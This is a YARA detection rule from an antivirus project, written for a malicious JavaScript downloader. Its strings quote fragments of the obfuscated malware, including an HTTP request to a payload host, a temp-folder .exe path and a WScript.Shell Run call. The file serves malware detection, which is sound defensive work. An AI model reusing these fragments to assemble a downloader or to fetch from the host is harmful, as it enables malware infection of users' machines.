rule sig_20160328_c576450abcf4908e05d4db1df6cda36e {
  meta:
    description = "datamaliciousorder - file 20160328_c576450abcf4908e05d4db1df6cda36e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9b1f2c76639179e8a030ab62592ab31a4ed73677b3472b5fca83bcad040b8b7f"

  strings:
    $s1  = "Boxuz[Etmavwld](\"GET\", \"http://mediaheadllc.com/k9ospw1\", false);" fullword ascii
    $s2  = "function Rwdurfwqr() {return Isrsvvxr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"gAt5ASRP8cbD5.exe\";};" fullword ascii
    $s3  = "do {WScript[Jcpqsly](Cgzeexao() * 11)} while (Boxuz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Isrsvvxr = function Xxxwnhrj() {return WScript[Btousbm](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Xfhot(Tybkrcxdhr, Afqzfuxc){return Tybkrcxdhr - Afqzfuxc;};" fullword ascii
    $s6  = "function Picyy(Vmscgufjm){Isrsvvxr[\"Run\"](Vmscgufjm, Ivkcjxkok, Ivkcjxkok);};" fullword ascii
    $s7  = "function Pftokpax() {return ((Fihmytruw == true) && (Fihmytruw == Aeypjphzmy)) ? 1 : Ivkcjxkok;};" fullword ascii
    $s8  = "var Fihmytruw = false;" fullword ascii
    $s9  = "var Aeypjphzmy = false;" fullword ascii
    $s10 = "function Plxlyyo(){return Btousbm;};" fullword ascii
    $s11 = "return Xfhot(Owsnuboo, Ggwglrwrv);" fullword ascii
    $s12 = "var Oykieuewg = new this[\"Date\"]();" fullword ascii
    $s13 = "Fihmytruw = true; " fullword ascii
    $s14 = "function Ojcqone(Dbofnyi) {var Kowpbci = (1, 2, 3, 4, 5, Dbofnyi); return Kowpbci;};" fullword ascii
    $s15 = " while (Smjyqfc){" fullword ascii
    $s16 = "var Jyokhjuc = false;" fullword ascii
    $s17 = "Aeypjphzmy = true; " fullword ascii
    $s18 = "function Cgzeexao(){return 22;};" fullword ascii
    $s19 = "function Nxbgbuu()" fullword ascii
    $s20 = "function Pdmhjf(){return Kbfcavvykp;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}